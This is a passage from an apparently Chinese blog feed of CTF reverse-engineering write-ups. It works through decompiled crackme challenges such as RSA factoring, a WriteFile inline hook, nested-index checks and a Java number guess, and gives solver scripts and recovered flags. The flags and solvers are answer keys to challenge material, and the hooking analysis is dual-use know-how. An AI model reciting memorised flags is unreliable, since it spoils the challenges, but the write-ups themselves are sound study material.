a2){  _BYTE *result; // rax  char v3; // [rsp+17h] [rbp-5h]  int i; // [rsp+18h] [rbp-4h]  v3 = *a1 &gt;&gt; 5;  for ( i = 0; a2 - 1 &gt; i; ++i )    a1[i] = 8 * a1[i] | (a1[i + 1] &gt;&gt; 5);  result = &amp;a1[i];  *result = 8 * *result | v3;  return result;}</code></pre><p>这个函数里有些很有意思的操作，这个或操作看着很熟悉，这是显然是一个换位的操作，但是这里用了前一个数和后一个数之间的交错换位，逆起来就有了一些难度。</p><p>我也看过一些其他大佬的wp，这里普遍都是采用了爆破的方法，我不是很喜欢，虽然爆破可能更加省时省力，我还是想更加加深一下逆向位运算的熟练程度。</p><p>经过观察我们可以很轻松的发现，只需要将所有的数拆成两部分，再按照反方向运算回去就可以了，非常简单。</p><p>这样的话所有的内容就分析完了，这里我用python来做的逆向（后悔没有用C++）</p><pre><code class="python">def sub_400936(a1):    result = a1 - 10    if a1 == 10:        result = a1 + 35    if a1 == 32 or a1 == 33 or a1 == 34:        result = a1 + 10    if a1 == 39:        result = a1 + 2    if a1 == 44:        result = a1 - 4    if a1 == 46:        result = a1 - 7    if a1 == 58 or a1 == 59:        result = a1 - 21    if a1 == 63:        result = a1 - 27    if a1 == 95:        result = a1 - 49    if a1 &lt;= 47 or a1 &gt; 48:        if a1 &lt;= 64 or a1 &gt; 90:            if 96 &lt; a1 &lt;= 122:                result = a1 - 87        else:            result = a1 - 55    else:        result = a1 - 48    return resultdef get_that_girl():    adic = {}    fp = open(&quot;that_girl&quot;, &quot;r&quot;)    while True:        data = fp.read(1)        if not data:            break        else:            data = sub_400936(ord(data))            if data in adic:                adic[data] = adic[data] + 1            else:                adic[data] = 1    fp.close()    return adicdef table():    t = {}    for ia in range(256):        t[sub_400936(ia)] = ia    return ta1 = [0xec, 0x29, 0xe3, 0x41, 0xe1, 0xf7, 0xaa, 0x1d, 0x29, 0xed, 0x29, 0x99, 0x39, 0xf3, 0xb7, 0xa9, 0xe7, 0xac, 0x2b,      0xb7, 0xab, 0x40, 0x9f, 0xa9, 0x31, 0x35, 0x2c, 0x29, 0xef, 0xA8, 0x3d, 0x4b, 0xb0, 0xe9, 0xe1, 0x68, 0x7b, 0x41]target = []part1 = []part2 = []for i in range(len(a1)):    part2.append((a1[i] &gt;&gt; 3) &amp; 0xff)    part1.append((a1[i] &lt;&lt; 5) &amp; 0xff)target.append(part2[0] | part1[len(a1) - 1])for i in range(1, len(a1)):    target.append(part2[i] | part1[i - 1])dword_6020A0 = [22, 0, 6, 2, 30, 24, 9, 1, 21, 7, 18, 10, 8, 12, 17, 23, 13, 4, 3, 14, 19, 11, 20, 16, 15, 5, 25, 36,                27, 28, 29, 37, 31, 32, 33, 26, 34, 35]i = 0index = []while (dword_6020A0[i]):    index.append(i)    i = dword_6020A0[i]index.append(1)index.reverse()a2 = [0 for i in range(len(index))]for i in index:    if i == 1:        a2[0] = target[i]    a2[i] = target[dword_6020A0.index(i)]dic = get_that_girl()dic_ = {v: k for k, v in dic.items()}flag = &#39;QCTF{&#39;for i in a2:    flag += chr(table()[dic_[i]])flag += &#39;}&#39;print(flag)</code></pre><p>最后一部分最开始是打算爆破，但是想到了一种更简便的方法，就是先把所有的ASCII码值遍历一遍，制作一个表，可以避免双重循环爆破，虽然实际上爆破也并不麻烦。</p><p>最后输出flag</p><pre><code>QCTF{that_girl_saying_no_for_your_vindicate}</code></pre><h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>找一道比较简单的题目保持一下做题的感觉</p><p>用Ghidra打开，部分函数的签名有问题，有时候将RDX误当作函数的参数，但是函数只需要两个参数，这里我打开IDA看了一下，IDA做的要比Ghidra好很多，根据汇编修改了一下函数签名，看一下主要的函数部分。</p><pre><code class="c++">undefined8 FUN_00100a21(void){  int iVar1;  long in_FS_OFFSET;  undefined local_4a8 [16];  undefined local_498 [16];  undefined local_488 [16];  undefined local_478 [16];  undefined local_468 [112];  undefined local_3f8 [1000];  long local_10;  local_10 = *(long *)(in_FS_OFFSET + 0x28);  puts(&quot;[sign in]&quot;);  printf(&quot;[input your flag]: &quot;);  __isoc99_scanf(&amp;DAT_00100c26,local_468);                    /* 字符串转16进制 */  FUN_0010096a(local_468,local_3f8);  __gmpz_init_set_str(local_478,&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;,                      0x10);  __gmpz_init_set_str(local_488,local_3f8,0x10);  __gmpz_init_set_str(local_4a8,                      &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;                      ,10);  __gmpz_init_set_str(local_498,&quot;65537&quot;,10);  __gmpz_powm(local_488,local_488,local_498,local_4a8);  iVar1 = __gmpz_cmp(local_488,local_478);  if (iVar1 == 0) {    puts(&quot;TTTTTTTTTTql!&quot;);  }  else {    puts(&quot;GG!&quot;);  }  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {                    /* WARNING: Subroutine does not return */    __stack_chk_fail();  }  return 0;}</code></pre><p>首先是需要我们输入字符串，然后进行了一些大数的操作，这里是利用了一个库，查了一下mannual，很好理解，输入之后有一个函数对我们输入的字符串进行了一些操作，进入这个函数</p><pre><code class="c++">void FUN_0010096a(char *param_1,long param_2){  size_t sVar1;  int local_20;  int local_1c;  local_20 = 0;  local_1c = 0;  while( true ) {    sVar1 = strlen(param_1);    if (sVar1 &lt;= (ulong)(long)local_20) break;    *(undefined *)(local_1c + param_2) = (&amp;DAT_00302010)[(int)(param_1[local_20] &gt;&gt; 4)];    *(undefined *)((long)local_1c + 1 + param_2) =         (&amp;DAT_00302010)[(int)((int)param_1[local_20] &amp; 0xf)];    local_20 = local_20 + 1;    local_1c = local_1c + 2;  }  return;}</code></pre><p>看到分别取低四位和高四位的操作之后立刻反应过来是把字符串转换为16进制串，耐心看一下很好理解。</p><p>回到主函数，看到乘幂取模操作，发现是RSA，用yafu分解一下<code>103461035900816914121390101299049044413950405173712170434161686539878160984549</code></p><p>分解的也很快，这个数还是不够大</p><pre><code>prp39 = 282164587459512124844245113950593348271prp39 = 366669102002966856876605669837014229419</code></pre><p>然后可以直接在线解密也是可以解出来的，由于gmpy2安装不上，直接在线解密了</p><pre><code>suctf{Pwn_@_hundred_years}</code></pre><h4 id="key"><a href="#key" class="headerlink" title="key"></a>key</h4><p>过程很复杂，动态调试绕过文件检测之后调试出flag</p><pre><code>idg_cni~bjbfi|gsxb</code></pre><h4 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h4><p>题目还是很不错，逻辑很清楚，仔细观察可以看出来杨辉三角就解决了，一共20层，全部组合起来取md5就可以了</p><pre><code class="python">import hashlibdef create(line):  # 生成杨辉三角的一行    L = [1]    for x in range(1, len(line)):        L.append(line[x] + line[x - 1])    L.append(1)    return LL = [1]raw_flag = &#39;1&#39;for x in range(19):    L = create(L)    raw_flag += &#39;&#39;.join([str(i) for i in L])# print(raw_flag)m = hashlib.md5(raw_flag.encode()).hexdigest()print(&#39;RCTF{&#39; + m + &#39;}&#39;)</code></pre><p>输出flag</p><pre><code>RCTF{37894beff1c632010dd6d524aa9604db}</code></pre><h4 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h4><p>没想到会用pwntools去爆破一道逆向题……</p><p>感觉有些复杂，无脑爆破得到结果</p><h4 id="catch-me"><a href="#catch-me" class="headerlink" title="catch-me"></a>catch-me</h4><p>这题用了<code>sse</code>算法，而且整个过程非常复杂，所以猜测了一下其中的两个数相同，然后得到了flag</p><h4 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h4><p>首先脱壳，然后观察IDA，发现函数很多进行了很多次的异或运算，因此选择直接动态调试，调试到关键函数的最后发现几个运算是算出了flag的三个部分，拼接得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解（三）</title>
    <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>题目还不是很难，所以还是放在一起来写</p><a id="more"></a><h4 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h4><p>这题并不知道是在干什么，IDA打开是个dumpfile，打开给了很多16进制，看到了<code>0x68</code>这个经典数字（<code>push</code>指令的编码)，后面接了两个字符，看到<code>fl</code>，感觉有问题，找到后面很多个<code>0x68</code>，每个后买你都跟了两个字符，像是把flag<code>push</code>进栈的操作，所以把这些数据导出，然后写个脚本跑一下，验证猜想</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x68, 0x66, 0x6C, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48,                    0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F,                    0x05, 0x68, 0x61, 0x67, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24,                    0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x0F, 0x05, 0x68, 0x7B, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34,                    0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05, 0x68, 0x6F, 0x70, 0x00, 0x00, 0x48, 0xBF,                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,                    0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x6F, 0x00, 0x00, 0x48,                    0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,                    0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x72, 0x00, 0x00,                    0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x65, 0x74, 0x00,                    0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7D, 0x0A,                    0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00,                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31,                    0xFF, 0x48, 0xB8, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                    0x00, 0x0F, 0x05            };    int len = sizeof(ida_chars)/ sizeof(ida_chars[0]);    string flag;    int i =0;    while(i!=len) {        if(ida_chars[i]==0x68)        {            while(ida_chars[++i]!=0x00)            {                flag+=ida_chars[i];            }        }        else        {            i++;        }    }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>输出flag</p><pre><code>flag{poppopret}</code></pre><p>提交的时候只需要中间的部分</p><h4 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h4><p>这题有很多string类，所以还是要慢慢分析</p><pre><code class="c++">__int64 __fastcall main(int a1, char **a2, char **a3){  char *v3; // rbx  __int64 v4; // rax  __int64 v5; // rdx  __int64 v6; // rax  __int64 v7; // rdx  __int64 v8; // rdx  __int64 v9; // rdx  __int64 i; // [rsp+10h] [rbp-60h]  char v12; // [rsp+20h] [rbp-50h]  char v13; // [rsp+4Fh] [rbp-21h]  __int64 v14; // [rsp+50h] [rbp-20h]  int v15; // [rsp+5Ch] [rbp-14h]  if ( a1 != 2 )  {    v3 = *a2;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Usage: &quot;, a3);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; flag\n&quot;, v7);    exit(0);  }  std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13);  std::allocator&lt;char&gt;::~allocator(&amp;v13);  v15 = 0;  for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; sub_400D7A(&amp;i) )  {    v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12);    if ( !sub_400D3D((__int64)&amp;i, (__int64)&amp;v14) )      break;    v9 = *(unsigned __int8 *)sub_400D9A((__int64)&amp;i);    if ( (_BYTE)v9 != off_6020A0[dword_6020C0[v15]] )      sub_400B56((__int64)&amp;i, (__int64)&amp;v14, v9);    ++v15;  }  sub_400B73((__int64)&amp;i, (__int64)&amp;v14, v8);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12);  return 0LL;}</code></pre><p>真正有用的内容只有一个for循环，在这之前我们输入的字符串被传入了<code>v12</code>，然后用迭代器进行循环，遍历整个字符串，每个字符被赋值给了<code>v9</code>，然后进行判断，如果判断可以通过，我们输入的就是正确的flag，判断的条件是<code>v9 = off_6020A0[dword_6020C0[v15]]</code>，一个嵌套索引，把数据导出之后很容易得到结果</p><pre><code class="python">target = &quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;dword_6020C0 = [36, 0, 5, 54, 101, 7, 39, 38, 45, 1, 3, 0, 13, 86, 1, 3, 101, 3, 45, 22, 2, 21, 3, 101, 0, 41, 68, 68,                1, 68, 43]flag = &#39;&#39;for i in dword_6020C0:    # print(i)    flag += target[i]print(flag)</code></pre><p>输出结果</p><pre><code>ALEXCTF{W3_L0v3_C_W1th_CL45535}</code></pre><h4 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h4><p>这题是MFC，题目中的函数很多，打开发现输入有错误提示，还是从字符串入手，找到了几个很有用的函数</p><pre><code class="c++">BOOL __cdecl sub_4017F0(int a1){  BOOL result; // eax  char Str1[28]; // [esp+D8h] [ebp-24h]  int v3; // [esp+F4h] [ebp-8h]  int v4; // [esp+F8h] [ebp-4h]  v4 = 0;  v3 = 0;  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )  {    Str1[v4] = alphabet[*(_DWORD *)(a1 + 4 * v4)];    ++v4;  }  Str1[v4] = 0;  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )    result = pass();  else    result = fail();  return result;}</code></pre><p>更改了一些函数和变量名，更容易辨认，这个函数传入了<code>a1</code>之后，对<code>a1</code>之后的地址上的内容作为索引值依次连接组成了一个新的字符串，所以<code>a1</code>显然应该是一个地址，或者说是一个数组的首地址，而这个数组的内容我们很容易就可以得到，接着再看到底在哪里引用了这个函数</p><pre><code class="c++">int __thiscall sub_401890(CWnd *this){  struct CString *v1; // ST08_4  CWnd *v2; // eax  int v3; // eax  int v5[26]; // [esp+4Ch] [ebp-74h]  int i; // [esp+B4h] [ebp-Ch]  char *Str; // [esp+B8h] [ebp-8h]  CWnd *v8; // [esp+BCh] [ebp-4h]  v8 = this;  v1 = (CWnd *)((char *)this + 100);  v2 = CWnd::GetDlgItem(this, 1002);  CWnd::GetWindowTextA(v2, v1);  v3 = sub_401A30((char *)v8 + 100);  Str = CString::GetBuffer((CWnd *)((char *)v8 + 100), v3);  if ( !strlen(Str) )    return CWnd::MessageBoxA(v8, &amp;Qingshuru, 0, 0);  for ( i = 0; Str[i]; ++i )  {    if ( Str[i] &gt; 57 || Str[i] &lt; 48 )    {      if ( Str[i] &gt; 122 || Str[i] &lt; 97 )      {        if ( Str[i] &gt; 90 || Str[i] &lt; 65 )          fail();        else          v5[i] = Str[i] - 29;      }      else      {        v5[i] = Str[i] - 87;      }    }    else    {      v5[i] = Str[i] - 48;    }  }  return sub_4017F0((int)v5);}</code></pre><p>这个函数也很简单，把输入的内容赋给<code>Str</code>，然后对str里面的字符进行一个变换，把变换后的数组传给刚刚分析的那个函数，所以想要逆向解出输入的字符就很简单了</p><pre><code class="python">str1 = &#39;KanXueCTF2019JustForhappy&#39;alphabet = &#39;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&#39;a1 = []for i in str1:    j = alphabet.index(i)    a1.append(j)# print(a1)flag = &#39;&#39;for i in a1:    if 0 &lt;= i &lt;= 9:        flag += chr(i + 48)    elif i &lt;= 35:        flag += chr(i + 87)    else:        flag += chr(i + 29)print(flag)</code></pre><p>根据题目要求把输出的内容套上flag</p><pre><code>flag{j0rXI4bTeustBiIGHeCF70DDM}</code></pre><h4 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h4><p>毫无意义的题目，打开就能看到flag，套上<code>flag{}</code>直接交上去就行了</p><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>题如其名，peid打开发现是c#，所以直接dnspy打开，发现flag是直接计算出来的，并且没有进行任何的反调试，所以直接调试运行几步就得到了flag</p><pre><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></pre><h4 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h4><p>这题是java逆向，cfr反编译之后，查看源代码</p><pre><code class="java">import java.io.PrintStream;import java.math.BigInteger;public class guess {    static String XOR(String _str_one, String _str_two) {        BigInteger i1 = new BigInteger(_str_one, 16);        BigInteger i2 = new BigInteger(_str_two, 16);        BigInteger res = i1.xor(i2);        String result = res.toString(16);        return result;    }    public static void main(String[] args) {        block5: {            int guess_number = 0;            int my_num = 349763335;            int my_number = 1545686892;            int flag = 345736730;            if (args.length &gt; 0) {                try {                    guess_number = Integer.parseInt(args[0]);                    if (my_number / 5 == guess_number) {                        String str_one = &quot;4b64ca12ace755516c178f72d05d7061&quot;;                        String str_two = &quot;ecd44646cfe5994ebeb35bf922e25dba&quot;;                        my_num += flag;                        String answer = guess.XOR(str_one, str_two);                        System.out.println(&quot;your flag is: &quot; + answer);                        break block5;                    }                    System.err.println(&quot;wrong guess!&quot;);                    System.exit(1);                }                catch (NumberFormatException e) {                    System.err.println(&quot;please enter an integer \nexample: java -jar guess 12&quot;);                    System.exit(1);                }            } else {                System.err.println(&quot;wrong guess!&quot;);                int num = 1000000;                ++num;                System.exit(1);            }        }    }}</code></pre><p>程序很简单，我们当然可以根据算法来算出来flag的值，但是完全可以得到需要输入的数，所以直接运行就好了</p><pre><code class="powershell">&gt;java -jar Guess-the-Number.jar 309137378</code></pre><p>输出结果</p><pre><code>your flag is: a7b08c546302cc1fd2a4d48bf2bf2ddb</code></pre><p>直接提交即可</p><h4 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h4><p>这题很有意思，值得好好分析一下，IDA打开，找到main函数</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  HANDLE v4; // eax  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h]  char Buffer; // [esp+8h] [ebp-20h]  puts((int)aPleaseInputFla);  scanf(a31s, &amp;Buffer);  if ( strlen(&amp;Buffer) == 19 )  {    sub_401220();    v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);    WriteFile(v4, &amp;Buffer, 19u, &amp;NumberOfBytesWritten, 0);    sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten);    if ( NumberOfBytesWritten == 1 )      puts((int)aRightFlagIsYou);    else      puts((int)aWrong);    system(aPause);    result = 0;  }  else  {    puts((int)aWrong);    system(aPause);    result = 0;  }  return result;}</code></pre><p>第一反应当然是查看一下<code>sub_401240()</code>的内容，毕竟这是最后一个调用<code>NumberOfBytesWritten</code>的函数，而这个值，经过<code>writeFile()</code>之后应该是19</p><pre><code class="c++">signed int __cdecl sub_401240(const char *a1, _DWORD *a2){  signed int result; // eax  unsigned int v3; // kr04_4  char v4[24]; // [esp+Ch] [ebp-18h]  result = 0;  strcpy(v4, &quot;This_is_not_the_flag&quot;);  v3 = strlen(a1) + 1;  if ( (signed int)(v3 - 1) &gt; 0 )  {    while ( v4[a1 - v4 + result] == v4[result] )    {      if ( ++result &gt;= (signed int)(v3 - 1) )      {        if ( result == 21 )        {          result = (signed int)a2;          *a2 = 1;        }        return result;      }    }  }  return result;}</code></pre><p>看到<code>This_is_not_the_flag</code>感觉有些不对，仔细观察发现这个字符串有20的字符，而下面的判断需要我们的输入和这个字符串相等，但是我们只输入19个字符，所以这个函数永远不可能返回我们想要的结果，肯定是有什么东西被漏掉了，所以返回<code>main</code>，前面还有一个<code>sub_401220()</code>没有看</p><pre><code class="c++">int sub_401220(){  HMODULE v0; // eax  DWORD v2; // eax  v2 = GetCurrentProcessId();  hProcess = OpenProcess(0x1F0FFFu, 0, v2);  v0 = LoadLibraryA(LibFileName);  dword_40C9C4 = (int)GetProcAddress(v0, unk_40A05C);// 找到writefile的地址  lpAddress = (LPVOID)dword_40C9C4;  if ( !dword_40C9C4 )    return puts((int)&amp;dword_40A044);  unk_40C9B4 = *(_DWORD *)lpAddress;  *((_BYTE *)&amp;unk_40C9B4 + 4) = *((_BYTE *)lpAddress + 4);  byte_40C9BC = 0xE9u;  dword_40C9BD = (char *)sub_401080 - (char *)lpAddress - 5;  return sub_4010D0();}</code></pre><p>在这里发现了问题，这里找到了储存<code>writefile()</code>地址的位置，然后保存前五个字节的内容，后面进行了一些赋值，看到<code>0xE9</code>就发现这里想要修改<code>writefile()</code>函数地址，跳转到另一个函数<code>sub_401080()</code>，然后函数进入<code>sub_4010D0()</code></p><pre><code class="c++">BOOL sub_4010D0(){  DWORD v1; // [esp+4h] [ebp-8h]  DWORD flOldProtect; // [esp+8h] [ebp-4h]  v1 = 0;  VirtualProtectEx(hProcess, lpAddress, 5u, 4u, &amp;flOldProtect);  WriteProcessMemory(hProcess, lpAddress, &amp;byte_40C9BC, 5u, 0);  return VirtualProtectEx(hProcess, lpAddress, 5u, flOldProtect, &amp;v1);}</code></pre><p>这个函数把刚刚的修改写进了相应的地址，此时程序一旦调用<code>writefile()</code>，就会跳转到<code>sub_401080()</code>，所以转到这个函数</p><pre><code class="c++">int __stdcall sub_401080(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped){  signed int v5; // ebx  v5 = sub_401000((int)lpBuffer, nNumberOfBytesToWrite);  sub_401140();  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);  if ( v5 )    *lpNumberOfBytesWritten = 1;  return 0;}</code></pre><p>如果<code>sub_401000()</code>返回值是1，就会输出我们的输入是正确的，<code>sub_401140()</code>是用来恢复<code>writefile()</code>函数的地址，就不再赘述，所以重点就是<code>sub_401000()</code></p><pre><code class="c++">signed int __cdecl sub_401000(int a1, signed int a2){  char v2; // al  char v3; // bl  char v4; // cl  int v5; // eax  v2 = 0;  if ( a2 &gt; 0 )  {    do    {      if ( v2 == 18 )      {        *(_BYTE *)(a1 + 18) ^= 0x13u;      }      else      {        if ( v2 % 2 )          v3 = *(_BYTE *)(v2 + a1) - v2;        else          v3 = *(_BYTE *)(v2 + a1 + 2);        *(_BYTE *)(v2 + a1) = v2 ^ v3;      }      ++v2;    }    while ( v2 &lt; a2 );  }  v4 = 0;  if ( a2 &lt;= 0 )    return 1;  v5 = 0;  while ( aAjygkfmSv8mln[v5] == *(_BYTE *)(v5 + a1) )  {    v5 = ++v4;    if ( v4 &gt;= a2 )      return 1;  }  return 0;}</code></pre><p>这里的操作就很简单了，也不需要再多说，我们的输入经过处理后如果和内存中的字符串相同，就对了</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() {    char str[20] =            &quot;ajygkFm.\x7F_~-SV{8mLn&quot;;    char a1[20] = {0};    for (int i = 0; i &lt; 19; i++) {        if (i == 18) {            a1[i] = str[18] ^ 0x13;        }        if (i % 2) {            a1[i] = (str[i] ^ i) + i;        } else {            a1[i + 2] = (str[i] ^ i);        }    }    a1[0]=&#39;f&#39;;    cout &lt;&lt; a1 &lt;&lt; endl;}</code></pre><p>这里有一点需要注意，这个程序是没法检测第一位输入的，中间的过程也完全没有用到第一位，所以根据输出结果手动添加了’f’，输出</p><pre><code>flag{Ho0k_w1th_Fun}</code></pre><p>可以验证一下，第一位其实并不影响结果</p><p><img src="https://s2.ax1x.com/2020/02/14/1XU7IP.png" srcset="/img/loading.gif" alt="EASYHOOK-1"></p><p>发现第一位改成其他的字符也是正确的</p><h4 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h4><p>这题还算是比较简单的题目，很容易就可以找到关键函数，然后发现所有的数据处理和验证全部都在这个函数里面</p><pre><code class="c++">__int64 __fastcall stringMod(__int64 *a1){  __int64 v1; // r9  __int64 v2; // r10  __int64 i; // rcx  signed int v4; // er8  int *v5; // rdi  int *v6; // rsi  signed int v7; // ecx  signed int v8; // er9  int v9; // er10  unsigned int v10; // eax  int v11; // esi  int v12; // esi  int v14[24]; // [rsp+0h] [rbp-60h]  int _48[24]; // [rsp+48h] [rbp-18h]  memset(v14, 0, 0x48uLL);  v1 = a1[1];  if ( v1 )  {    v2 = *a1;    i = 0LL;    v4 = 0;    do    {      v12 = *(char *)(v2 + i);      v14[i] = v12;      if ( 3 * ((unsigned int)i / 3) == (_DWORD)i &amp;&amp; v12 != firstchar[(unsigned int)i / 3] )// 3的倍数等于firstchar        v4 = -1;      ++i;    }    while ( i != v1 );  }  else  {    v4 = 0;  }  v5 = v14;  v6 = v14;  v7 = 666;  do  {    *v6 = v7 ^ *(unsigned __int8 *)v6;    v7 += v7 % 5;    ++v6;  }  while ( _48 != v6 );  v8 = 1;  v9 = 0;  v10 = 1;  v11 = 0;  do  {    if ( v11 == 2 )    {      if ( *v5 != thirdchar[v9] )        v4 = -1;      if ( v10 % *v5 != masterArray[v9] )        v4 = -1;      ++v9;      v10 = 1;      v11 = 0;    }    else    {      v10 *= *v5;      if ( ++v11 == 3 )        v11 = 0;    }    ++v8;    ++v5;  }  while ( v8 != 19 );  return (unsigned int)(v7 * v4);}</code></pre><p>发现把输入分成了三个部分，处理起来也很简单，写脚本处理</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() {    int firstchar[8] =            {65, 105, 110, 69, 111, 97};    int thirdchar[8] =            {751, 708, 732, 711, 734, 764};    int masterArray[6] =            {471, 12, 580, 606, 147, 108};    int xor_[24] = {0};    char flag[24] = {0};    xor_[0] = 666;    for (int i = 1; i &lt; 24; i++) {        xor_[i] = xor_[i - 1] + xor_[i - 1] % 5;    }    for (int i = 0; i &lt; 6; i++) {        flag[3 * i] = firstchar[i];        flag[3 * i + 2] = thirdchar[i] ^ xor_[3 * i + 2];        for (int j = 48; j &lt; 122; j++) {            if ((j &gt;= 48 &amp;&amp; j &lt;= 57) || (j &gt;= 65 &amp;&amp; j &lt;= 90) || (j &gt;= 97 